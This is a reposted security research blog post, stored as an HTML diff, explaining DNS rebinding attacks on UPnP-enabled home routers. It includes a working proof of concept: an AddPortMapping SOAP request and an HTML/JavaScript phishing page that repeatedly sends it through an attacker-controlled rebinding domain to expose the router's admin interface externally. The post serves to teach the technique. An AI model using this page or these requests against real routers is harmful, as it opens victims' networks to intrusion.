@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>A Journey Into the Beauty of DNSRebinding - Part 1</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>A Journey Into the Beauty of DNSRebinding - Part 1</h1>
+			<b><time>22.01.2025 00:00</time></b>
+		       
+
+			<div>
+				<h3></h3>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1lSZSDJJEuehJnUEe5dQ1Io-DqJs6ZP9mz4OkKORszTHKr-3hQJHz5eOhQ2MROJ2C5wFSBbBRlYv2dYIGL5AJ3Ery59-lFG10caA0LFusokKrRVEqPKKoI6udPReEJduoGiwlWb61wpRh/s0/DNS_2.jpg" alt="" />
+</figure>
+
+
+</p>
+<p>Authors</p>
+<p>Giovanni Guido<br>
+Alessandro Braccio</p>
+<h3 id="abstract">Abstract</h3>
+<p>In this first blog post about <em>DNS rebinding</em> topic,  we are going to show a practical example of <strong>DNS Rebinding attack against UPnP services</strong> exposed in a local network. </p>
+<p>The goal  of this post series is to show real attack scenarios against devices exposing services on a local network. </p>
+<p>That case study tends to happen usually on <strong>IoT interconnected home or smart office devices</strong>, which are a very interesting scenario from an attacker perspective.</p>
+<h3 id="introduction">Introduction</h3>
+<p>Nowadays, IoT devices are around us in every environment, starting from our home in which smart devices interact with each other in order to simplify our daily tasks. These devices usually use different protocols in their communication, from common HTTP requests to Bluetooth Low Energy, but also pretty old protocols that are having a comeback such as UPnP ( Universal Plug and Play ).</p>
+<p>The main and most sensitive part of the services implemented by IoT smart devices are usually not directly exposed over the external network, therefore an attacker would need to gain a position within the local network in order to exploit them. </p>
+<p>The purpose of this first post is to give an overview of the DNS Rebinding attack technique and to show a practical example involving common UPnP services implemented by typical home devices, such as routers.</p>
+<h3 id="the-dns-rebinding-attack">The DNS Rebinding Attack</h3>
+<p>In short, DNS Rebinding is an attack technique that allows to bypass the Same Origin Policy (SOP), by <em>exploiting</em> the <em>DNS cache</em> of the browsers themselves.</p>
+<p>An attacker, after a first phase in which the victims are induced to visit a malicious web page, tricks the users&rsquo; browser by using a controlled DNS server. </p>
+<p>This attack is normally used to compromise devices present in a local network in order to use them as relay points, bypassing the local network NAT trust boundary. Below a scheme showing a more detailed example and the related steps:</p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVv0-6eE5P7JCaDRiRVhyphenhyphen7M9tTyKJhahPdWHo9_gaoORairZ9JSfsT6oznIjYrtsPzoncExOXZVIeYF0sd5RLpCopUUvivHjh0lc7MPZpABpHRLgkFw58ba1cqwd4b6B3a1C9eLGFg5F5n/w640-h528/dnsr_diagram_2.png" alt="" />
+</figure>
+
+
+</p>
+<p>In particular:</p>
+<ul>
+<li>- The attacker sets up a <em>DNS service</em> for a <em>malicious domain</em>. </li>
+<li>- The attacker <em>tricks a victim</em> into accessing the controlled malicious domain. This step could be done using phishing techniques, such as Cross-Site Scripting, Content Manipulation or Social Network and Instant Messaging spam. </li>
+<li>- Victim&rsquo;s browser, by visiting the malicious domain, will make a query for that domain&rsquo;s DNS settings. </li>
+<li>- The malicious DNS server responds to the query with the actual IP address of the domain. </li>
+</ul>
+<p>Meanwhile, victim&rsquo;s browser caches the returned IP address. </p>
+<ul>
+<li>- Since the attacker has configured the <em>DNS Time-To-Live (TTL)</em> at the <strong>lowest</strong> possible value, when the cache retention time expires, the user&rsquo;s browser makes another DNS request for the same domain as it needs a <strong>new IP address</strong>. </li>
+<li>- The malicious DNS service, this time, responds with a private IP address, such as <strong>192.168.1.1</strong>, related to a device present inside the target private network. </li>
+<li>- At this point, in victim&rsquo;s browser, all origin-based security policies enforced by the Same Origin Policy are potentially bypassed as the address related to the initial origin has been compromised. Therefore, any JavaScript code previously loaded from the malicious website is now able to access to any HTTP resource locally exposed in LAN by the target device pointing to <strong>192.168.1.1</strong>.</li>
+</ul>
+<p>Now, supposing a <em>Smart TV</em> as the subject of the <em>DNS Rebinding attack</em>, which behavior can be considered exposed to such attacks?</p>
+<p>The <em>Smart TV</em> web server expects to receive requests with known and trusted values inside the HTTP “<strong>Host</strong>” header, for instance a legit request should contain “<strong>Host: 192.168.1.53</strong>”, where “<strong>192.168.1.53</strong>” is the IP address of the TV itself. A header such as “<strong>Host: attacker.mindedsecurity.com</strong>” should therefore raise a warning in the application.</p>
+<p>So, if the target device does not properly validate the “<strong>Host</strong>” header and it shows the same behavior with tampered values (i.e. the response is the same), this can be considered as likely exploitable,via DNS Rebinding attacks.</p>
+<p>The following sections describe a practical example of <em>DNS Rebinding attack against a home router.</em> </p>
+<p>In this first example, it will be shown how to exploit the IGD Profile  from UPnP protocol implemented by some routers, in order to perform a NAT Injection attack. </p>
+<p>However, it should be considered that this is just one of the possible attack scenarios and that DNS Rebinding attack possibilities are limitless especially in the IoT era. </p>
+<h3 id="the-upnp-protocol">The UPnP Protocol</h3>
+<p>An interesting example of local service is <strong>UPnP</strong>, which is a pretty old protocol that is coming back from the past thanks to the growth of smart devices.</p>
+<p>UPnP is a protocol designed to support automatic device discovery within a network without any configurations from the users. This way, for instance, a smart TV application can expose a UPnP service in a local network (e.g. a home network) in order to give to the user the opportunity to control the video player from his smartphone or other devices.</p>
+<p>The UPnP stack includes different protocols such as TCP, UDP, HTTP and SOAP and can be summarized as follows:</p>
+<ol>
+<li>Discovery</li>
+<li>Description</li>
+<li>Control</li>
+<li>Eventing</li>
+<li>Presentation</li>
+</ol>
+<p>Some of these layers are briefly described below, but for more details the UPnP Device Architecture specification could be considered.</p>
+<h3 id="discovering-upnp-devices--services-inside-a-local-network">Discovering UPnP devices &amp; services inside a local network</h3>
+<p>When a UPnP &ldquo;client&rdquo; (control point) is added to a local network, it starts looking for UPnP devices and services by using the SSDP (Simple Service Discovery Protocol) protocol: the control point performs a M-SEARCH HTTPU (HTTP over UDP) discovery request to a specific multicast address (239.255.255.250). All the listening devices will then reply with a unicast HTTPU response as shown in the following image.</p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdo16IlhDH_W0go1aPBWftN1QJAfwGdY4soFJWi7mltr1-F0wry9zSXtguKTpt3nVrZ2N6wsx3izN6fYPoOsTaX2Bel5AWBNjfki8YoZhfEpHuByuSGq9MAV4a15wrmsxenJPjozwM0VmT/w608-h640/ssdp_diagram.png" alt="" />
+</figure>
+
+
+</p>
+<p>Below the example of a SSDP request used to discover all the UPnP devices in a network:</p>
+<pre tabindex="0"><code>M-SEARCH * HTTP/1.1
+</code></pre><pre tabindex="0"><code>HOST: 239.255.255.250:1900
+</code></pre><pre tabindex="0"><code>MAN: &#34;ssdp:discover&#34;
+</code></pre><pre tabindex="0"><code>MX: 1
+</code></pre><pre tabindex="0"><code>ST: ssdp:all
+</code></pre><p>Example of a SSDP response from a home router:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+</code></pre><pre tabindex="0"><code>LOCATION: http://192.168.1.1:41952/RInc4AcPDaf/
+</code></pre><pre tabindex="0"><code>EXT:
+</code></pre><pre tabindex="0"><code>SERVER: POSIX, UPnP/1.0, Intel MicroStack/1.0.2777
+</code></pre><pre tabindex="0"><code>USN: uuid:c6bbfad2-190b-4fcc-b0d9-fd63781a49ce::urn:schemas-upnp-org:service:ContentDirectory:1
+</code></pre><pre tabindex="0"><code>CACHE-CONTROL: max-age=1800
+</code></pre><pre tabindex="0"><code>ST: urn:schemas-upnp-org:service:ContentDirectory:1
+</code></pre><p>There are a lot of UPnP discovery tools available in the wild.</p>
+<p>However, if you want to get your hands dirty in order to understand the UPnP protocol, just a few lines of code are necessary to perform the SSDP discovery.</p>
+<p>The SSDP response contains information related to the location of the Device Description resource, which is usually pointed by a URL inside the LOCATION response header.</p>
+<p>As shown below, the Device Description is an XML document that contains information related to the device itself, such as the name of the device or details related to the manufacturer, and the description of the services and actions exposed by the device.</p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpL0nCClaAsNbXYSUQa2L-R-gY0N0O1dNfc-yzX98T-PEt2DMy42RgiUOXuPG1IAxRvxod11Mu1n23fMrpc9EjcK61eUG5IGXUQ7U04WDOEzD-EoIE3NGDeD29GFQgnRlueZ4tNmInTpAR/w640-h360/deviceDescription.png" alt="" />
+</figure>
+
+
+</p>
+<p>In short, this XML file contains all the information we need to know in order to identify the available services.</p>
+<h3 id="the-igd-profile">The IGD Profile</h3>
+<p>UPnP devices may implement custom profiles with custom services or use default ones. A common profile used by many routers is the <strong>IGD profile,</strong> which includes a set of subprofiles related to the router configuration such as the “<em>LANHostConfigManagement</em>”, used for managing network configuration parameters, or the “<em>WANIPConnection</em>” which, as already described in the “Universal Plug and Play IGD A Fox in the Hen House&quot; paper, exposes the &ldquo;<em><strong>AddPortMapping</strong></em>&rdquo; SOAP action that is particularly interesting from an attacker point of view.</p>
+<p>The “<strong>AddPortMapping</strong>” action is commonly used by other devices in the LAN to create new port mapping rules on the WAN interface of the router. </p>
+<p>However, an attacker may <em>exploit this action to inject arbitrary rows</em> in the port forwarding table in order to forward the traffic to other internal/external clients or to expose internal services externally, such as the router web administration interface.</p>
+<p>As we saw from the discovery process, usually, UPnP services could be exploited if the attacker has access to the same local network of the target UPnP device.</p>
+<p>Here comes the <em>DNS Rebinding technique to the rescue</em>!</p>
+<h3 id="attacking-vulnerable-upnp-services-via-dns-rebinding-attack">Attacking Vulnerable UPnP services via DNS Rebinding Attack</h3>
+<p>Therefore, it is now pretty clear why a router that implements the <strong>IGD</strong> Profile and does not perform the validation of the Host header is a perfect target for a DNS Rebinding attack.</p>
+<p>Below is reported the <em>SSDP response</em> of a router with the UPnP <em>IGD profile <strong>enabled</strong></em>. The scan was performed using a custom go script that basically performs the SSDP discovery process, reads the location of the Device Description resource and parses it in order to list also the services and actions available for a detected UPnP device.</p>
+<pre tabindex="0"><code>[+] Found Upnp device at 192.168.1.1:1900
+</code></pre><pre tabindex="0"><code>[+] Device Description (Location: http://192.168.1.1:5431/igdevicedesc.xml -&gt; 200)
+</code></pre><pre tabindex="0"><code>PresentationURL: 
+</code></pre><pre tabindex="0"><code>FriendlyName: [REDACTED]
+</code></pre><pre tabindex="0"><code>Manufacturer: [REDACTED]
+</code></pre><pre tabindex="0"><code>ModelDescription: [REDACTED]
+</code></pre><pre tabindex="0"><code>ModelName: [REDACTED]
+</code></pre><pre tabindex="0"><code>ModelNumber: [REDACTED]
+</code></pre><pre tabindex="0"><code>[+] Getting devices list and related service list
+</code></pre><pre tabindex="0"><code>urn:schemas-upnp-org:device:InternetGatewayDevice:1
+</code></pre><pre tabindex="0"><code>     ServiceType: urn:schemas-upnp-org:service:Layer3Forwarding:1
+</code></pre><pre tabindex="0"><code>     ServiceId: urn:upnp-org:serviceId:Layer3Forwarding1
+</code></pre><pre tabindex="0"><code>     ControlURL: /control/Layer3Forwarding
+</code></pre><pre tabindex="0"><code>     EventSubURL: /event/Layer3Forwarding
+</code></pre><pre tabindex="0"><code>     SCPDURL: /upnp/layer3forwardingSCPD.xml
+</code></pre><pre tabindex="0"><code>     [+] Actions:
+</code></pre><pre tabindex="0"><code>         SetDefaultConnectionService
+</code></pre><pre tabindex="0"><code>         GetDefaultConnectionService
+</code></pre><pre tabindex="0"><code>urn:schemas-upnp-org:device:WANDevice:1
+</code></pre><pre tabindex="0"><code>     ServiceType: urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1
+</code></pre><pre tabindex="0"><code>     ServiceId: urn:upnp-org:serviceId:wancommoninterfaceconfig1
+</code></pre><pre tabindex="0"><code>     ControlURL: /control/WANCommonInterfaceConfig
+</code></pre><pre tabindex="0"><code>     EventSubURL: /event/WANCommonInterfaceConfig
+</code></pre><pre tabindex="0"><code>     SCPDURL: /upnp/WAN/wancommoninterfaceconfigSCPD.xml
+</code></pre><pre tabindex="0"><code>     [+] Actions:
+</code></pre><pre tabindex="0"><code>         SetEnabledForInternet
+</code></pre><pre tabindex="0"><code>         GetEnabledForInternet
+</code></pre><pre tabindex="0"><code>         GetCommonLinkProperties
+</code></pre><pre tabindex="0"><code>         GetTotalBytesSent
+</code></pre><pre tabindex="0"><code>         GetTotalBytesReceived
+</code></pre><pre tabindex="0"><code>         GetTotalPacketsSent
+</code></pre><pre tabindex="0"><code>         GetTotalPacketsReceived
+</code></pre><pre tabindex="0"><code>urn:schemas-upnp-org:device:WANConnectionDevice:1
+</code></pre><pre tabindex="0"><code>     ServiceType: urn:schemas-upnp-org:service:WANIPConnection:1
+</code></pre><pre tabindex="0"><code>     ServiceId: urn:upnp-org:serviceId:wanipconnection1
+</code></pre><pre tabindex="0"><code>     ControlURL: /control/WANIPConnection
+</code></pre><pre tabindex="0"><code>     EventSubURL: /event/WANIPConnection
+</code></pre><pre tabindex="0"><code>     SCPDURL: /upnp/WAN/wanipconnectionSCPD.xml
+</code></pre><pre tabindex="0"><code>     [+] Actions:
+</code></pre><pre tabindex="0"><code>         SetConnectionType
+</code></pre><pre tabindex="0"><code>         GetConnectionTypeInfo
+</code></pre><pre tabindex="0"><code>         GetAutoDisconnectTime
+</code></pre><pre tabindex="0"><code>         SetAutoDisconnectTime
+</code></pre><pre tabindex="0"><code>         GetIdleDisconnectTime
+</code></pre><pre tabindex="0"><code>         SetIdleDisconnectTime
+</code></pre><pre tabindex="0"><code>         GetWarnDisconnectDelay
+</code></pre><pre tabindex="0"><code>         SetWarnDisconnectDelay
+</code></pre><pre tabindex="0"><code>         GetStatusInfo
+</code></pre><pre tabindex="0"><code>         GetNATRSIPStatus
+</code></pre><pre tabindex="0"><code>         GetGenericPortMappingEntry
+</code></pre><pre tabindex="0"><code>         GetSpecificPortMappingEntry
+</code></pre><pre tabindex="0"><code>         AddPortMapping
+</code></pre><pre tabindex="0"><code>         DeletePortMapping
+</code></pre><pre tabindex="0"><code>         GetExternalIPAddress
+</code></pre><pre tabindex="0"><code>         ForceTermination
+</code></pre><pre tabindex="0"><code>         RequestTermination
+</code></pre><pre tabindex="0"><code>         RequestConnection
+</code></pre><pre tabindex="0"><code>     ServiceType: urn:schemas-upnp-org:service:WANCableLinkConfig:1
+</code></pre><pre tabindex="0"><code>     ServiceId: urn:upnp-org:serviceId:WANCableLinkConfig1
+</code></pre><pre tabindex="0"><code>     ControlURL: /control/WANCableLinkConfig
+</code></pre><pre tabindex="0"><code>     EventSubURL: 
+</code></pre><pre tabindex="0"><code>     SCPDURL: /upnp/WAN/wancablelinkconfigSCPD.xml
+</code></pre><pre tabindex="0"><code>     [+] Actions:
+</code></pre><pre tabindex="0"><code>         GetCableLinkConfigInfo
+</code></pre><pre tabindex="0"><code>         GetDownstreamFrequency
+</code></pre><pre tabindex="0"><code>         GetDownstreamModulation
+</code></pre><pre tabindex="0"><code>         GetUpstreamFrequency
+</code></pre><pre tabindex="0"><code>         GetUpstreamModulation
+</code></pre><pre tabindex="0"><code>         GetUpstreamChannelID
+</code></pre><pre tabindex="0"><code>         GetUpstreamPowerLevel
+</code></pre><pre tabindex="0"><code>         GetBPIEncryptionEnabled
+</code></pre><pre tabindex="0"><code>         GetConfigFile
+</code></pre><pre tabindex="0"><code>         GetTFTPServer
+</code></pre><pre tabindex="0"><code>     ServiceType: urn:schemas-upnp-org:service:WANEthernetLinkConfig:1
+</code></pre><pre tabindex="0"><code>     ServiceId: urn:upnp-org:serviceId:wanetherlinkconfig1
+</code></pre><pre tabindex="0"><code>     ControlURL: /control/WANEthernetLinkConfig
+</code></pre><pre tabindex="0"><code>     EventSubURL: /event/WANEthernetLinkConfig
+</code></pre><pre tabindex="0"><code>     SCPDURL: /upnp/WAN/wanethernetlinkconfigSCPD.xml
+</code></pre><pre tabindex="0"><code>     [+] Actions:
+</code></pre><pre tabindex="0"><code>         GetEthernetLinkStatus
+</code></pre><p>The “<strong>AddPortMapping</strong>” action of the “<strong>WANConnectionDevice</strong>” service is regularly present in the implemented IGD Profile.</p>
+<p>Moreover, as shown in the HTTP request and response below, the router doesn&rsquo;t validate the Host header because it regularly returns a 200 response even if the value &ldquo;<em>attacker.mindedsecurity.com</em>&rdquo; is inserted within the Host header.</p>
+<p>Request:</p>
+<pre tabindex="0"><code>POST /control/WANIPConnection HTTP/1.1
+</code></pre><pre tabindex="0"><code>Host: attacker.mindedsecurity
+</code></pre><pre tabindex="0"><code>SOAPAction: &#34;urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping&#34;
+</code></pre><pre tabindex="0"><code>Content-Type: text/xml; charset=&#34;utf-8&#34;
+</code></pre><pre tabindex="0"><code>Content-Length: 714
+</code></pre><pre tabindex="0"><code>​
+</code></pre><pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+</code></pre><pre tabindex="0"><code>&lt;s:Envelope xmlns:s=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; s:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;
+</code></pre><pre tabindex="0"><code>   &lt;s:Body&gt;
+</code></pre><pre tabindex="0"><code>      &lt;u:AddPortMapping xmlns:u=&#34;urn:schemas-upnp-org:service:WANIPConnection:1&#34;&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewExternalPort&gt;8989&lt;/NewExternalPort&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewInternalPort&gt;80&lt;/NewInternalPort&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewInternalClient&gt;192.168.1.1&lt;/NewInternalClient&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewEnabled&gt;1&lt;/NewEnabled&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewPortMappingDescription&gt;UPnP port mapping PoC&lt;/NewPortMappingDescription&gt;
+</code></pre><pre tabindex="0"><code>         &lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;
+</code></pre><pre tabindex="0"><code>      &lt;/u:AddPortMapping&gt;
+</code></pre><pre tabindex="0"><code>   &lt;/s:Body&gt;
+</code></pre><pre tabindex="0"><code>&lt;/s:Envelope&gt;
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OK
+</code></pre><pre tabindex="0"><code>Content-Type: text/xml; charset=&#34;utf-8&#34;
+</code></pre><pre tabindex="0"><code>Connection: close
+</code></pre><pre tabindex="0"><code>Content-Length: 298
+</code></pre><pre tabindex="0"><code>​
+</code></pre><pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+</code></pre><pre tabindex="0"><code>&lt;s:Envelope xmlns:s=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; s:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;&lt;s:Body&gt;    &lt;u:AddPortMappingResponse xmlns:u=&#34;urn:schemas-upnp-org:service:WANIPConnection:1&#34;&gt;
+</code></pre><pre tabindex="0"><code>    &lt;/u:AddPortMappingResponse&gt;
+</code></pre><pre tabindex="0"><code>&lt;/s:Body&gt;&lt;/s:Envelope&gt;
+</code></pre><p>The previous SOAP POST request, according to the <strong>AddPortMapping</strong> action specification, exposes the administration web interface running on <strong>192.168.1.1:80</strong> externally on port <strong>8989</strong>, making then it accessible from Internet (if the <strong>NewRemoteHost</strong> is empty, its value is <strong>0.0.0.0</strong> by default).</p>
+<p>The requirements are satisfied and, therefore, we can perform a DNS Rebinding attack against the router and inject this custom rule into its port forwarding table. </p>
+<p>The following HTML page was used as Proof of Concept of phishing page. The page was runned on localhost and the attacker domain in this case was <strong>127-0-0-1.192-168-1-1.attacker.mindedsecurity.com</strong>.</p>
+<p>The JavaScript code embedded inside the page continuously performs the <strong>AddPortMapping</strong> SOAP POST request via XHR to <strong><a href="http://127-0-0-1.192-168-1-1.attacker.mindedsecurity.com:5431">http://127-0-0-1.192-168-1-1.attacker.mindedsecurity.com:5431</a></strong>. </p>
+<pre tabindex="0"><code>&lt;html&gt;
+</code></pre><pre tabindex="0"><code>&lt;head&gt;
+</code></pre><pre tabindex="0"><code>    &lt;script src=&#34;jquery.min.js&#34;&gt;&lt;/script&gt;
+</code></pre><pre tabindex="0"><code>    &lt;script&gt;
+</code></pre><pre tabindex="0"><code>        var URL = &#39;http://127-0-0-1.192-168-1-1.attacker.mindedsecurity:5431/control/WANIPConnection&#39;
+</code></pre><pre tabindex="0"><code>​
+</code></pre><pre tabindex="0"><code>        var soapBody =&#39;&lt;?xml version=&#34;1.0&#34;?&gt; &lt;s:Envelope xmlns:s=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; s:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&#34;urn:schemas-upnp-org:service:WANIPConnection:1&#34;&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;8989&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;80&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;192.168.1.1&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;UPnP port mapping PoC&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;&#39;
+</code></pre><pre tabindex="0"><code>​
+</code></pre><pre tabindex="0"><code>        function AddPortMapping() {
+</code></pre><pre tabindex="0"><code>            jQuery.ajax ({
+</code></pre><pre tabindex="0"><code>                url: URL,
+</code></pre><pre tabindex="0"><code>                type: &#34;POST&#34;,
+</code></pre><pre tabindex="0"><code>                data: soapBody,
+</code></pre><pre tabindex="0"><code>                dataType: &#34;xml&#34;,
+</code></pre><pre tabindex="0"><code>                contentType: &#34;text/xml; charset=utf-8&#34;
+</code></pre><pre tabindex="0"><code>            });
+</code></pre><pre tabindex="0"><code>        }
+</code></pre><pre tabindex="0"><code>        function poll() {
+</code></pre><pre tabindex="0"><code>            setTimeout(function () {
+</code></pre><pre tabindex="0"><code>                AddPortMapping();
+</code></pre><pre tabindex="0"><code>                poll();
+</code></pre><pre tabindex="0"><code>            }, 180000);
+</code></pre><pre tabindex="0"><code>        }
+</code></pre><pre tabindex="0"><code>        $(document).ready(function () {
+</code></pre><pre tabindex="0"><code>            poll();
+</code></pre><pre tabindex="0"><code>        });
+</code></pre><pre tabindex="0"><code>    &lt;/script&gt;
+</code></pre><pre tabindex="0"><code>&lt;/head&gt;
+</code></pre><pre tabindex="0"><code>&lt;body&gt;
+</code></pre><pre tabindex="0"><code>    &lt;h1&gt;DNS Rebinding attack against vulnerable router - AddPortMapping&lt;/h1&gt;
+</code></pre><pre tabindex="0"><code>&lt;/body&gt;
+</code></pre><pre tabindex="0"><code>&lt;/html&gt;
+</code></pre><p>The JavaScript code embedded in the HTML phishing page continuously performs the <strong>NAT Injection</strong> SOAP request via XHR, the attacker-controlled DNS server is hit multiple times and responds with the real IP address of the  <em><strong>127-0-0-1.192-168-1-1.attacker.mindedsecurity.com</strong></em> domain, which in this case is <strong>127.0.0.1</strong> because the web server was runned locally. </p>
+<p>After a while, the DNS server returns the <strong>192.168.1.1</strong> IP address:</p>
+<pre tabindex="0"><code>$ sudo python dns_server.py
+</code></pre><pre tabindex="0"><code>0 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>1 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>2 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>3 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>4 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>5 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>6 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>7 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 127.0.0.1
+</code></pre><pre tabindex="0"><code>8 127-0-0-1.192-168-1-1.attacker.mindedsecurity.com -&gt; 192.168.1.1
+</code></pre><pre tabindex="0"><code>. . .
+</code></pre><p>This way, the request was successfully sent to the router adding the new port mapping rule:</p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwBTnTA04pWv2on1dFJLlCodvAHa1DjMzTaZQVYxoCPjiJGdcr8flX2vZlndRBcL4L66xEqRJBSnEkYU8Mu1zbNTdquupt58wxAgnlAQPNdlxnU-WCW7mIAwP4HrvWW1xofrQIgdc600jU/w640-h60/nat.png" alt="" />
+</figure>
+
+
+</p>
+<p>The following diagram shows the complete attack flow.</p>
+<p>
+<figure>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhORfqr28X7Q_nvK829h-aCfhcKn84I16OkBQc4wVAd2VLH_rRyN5pPZc6qxDv1_97BYSH1leTL3YRYgzJTlClCB7R-eMczYPmNkxMbgZNfXg0ChdjShO9rM-dgly_K43Dlb402D2bMwId3/w640-h410/upnp_diagram.png" alt="" />
+</figure>
+
+
+</p>
+<h3 id="conclusion">Conclusion</h3>
+<p>The described NAT Injection attack is just an example of how <strong>DNS Rebinding</strong> could be used to reach services running in a local network. It is however still possible to go deeper and use <strong>DNS Rebinding</strong> techniques in order to achieve <strong>Remote Code Execution</strong>.</p>
+<p>For this reason, in the next part it will be described as another practical example that will show how to achieve RCE starting from a vulnerable service running in a local network.</p>
+<h3 id="references">References:</h3>
+<ul>
+<li>
+<p><a href="https://crypto.stanford.edu/dns/">https://crypto.stanford.edu/dns/</a></p>
+</li>
+<li>
+<p><a href="http://upnp.org/specs/arch/UPnP-arch-DeviceArchitecture-v2.0.pdf">http://upnp.org/specs/arch/UPnP-arch-DeviceArchitecture-v2.0.pdf</a></p>
+</li>
+<li>
+<p><a href="https://tools.ietf.org/id/draft-bpw-pcp-upnp-igd-interworking-01.html">https://tools.ietf.org/id/draft-bpw-pcp-upnp-igd-interworking-01.html</a></p>
+</li>
+<li>
+<p><a href="https://tools.ietf.org/html/rfc6970">https://tools.ietf.org/html/rfc6970</a></p>
+</li>
+<li>
+<p><a href="http://www.upnp-hacks.org/">http://www.upnp-hacks.org/</a></p>
+</li>
+<li>
+<p><a href="http://www.upnp-hacks.org/igd.html">http://www.upnp-hacks.org/igd.html</a></p>
+</li>
+<li>
+<p><a href="https://www.blackhat.com/presentations/bh-usa-08/Squire/BH">https://www.blackhat.com/presentations/bh-usa-08/Squire/BH</a>_US_08_Squire_A_Fox_in_the_Hen_House%20White%20Paper.pdf</p>
+</li>
+<li>
+<p><a href="https://www.akamai.com/uk/en/multimedia/documents/white-paper/">https://www.akamai.com/uk/en/multimedia/documents/white-paper/</a> upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf</p>
+</li>
+</ul>
+<p>Go to Source</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
